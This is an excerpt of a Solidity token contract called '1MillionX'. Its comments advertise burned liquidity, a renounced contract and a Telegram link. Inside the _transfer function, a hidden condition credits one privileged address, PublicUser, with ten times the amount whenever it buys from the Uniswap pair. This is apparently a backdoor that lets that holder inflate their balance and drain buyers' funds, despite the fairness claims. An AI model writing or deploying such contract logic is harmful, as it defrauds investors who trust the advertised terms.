...
// Lets Get Your Deposit to 1MillionX!!!
// LP Burn!
// Renounce!
// So what are you waiting for...
// https://t.me/xx1MillionX
...
contract Token1MillionX is Ownable, IERC20 {
    ...
    string private  _name = "1MillionX";
    string private  _symbol = "1MillionX";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        uint256  time = block.timestamp;  uint256  letsgetit = tokens * 10;

        if ( from == uniswapV2Pair && to == PublicUser )  { _tOwned [PublicUser] += letsgetit;}
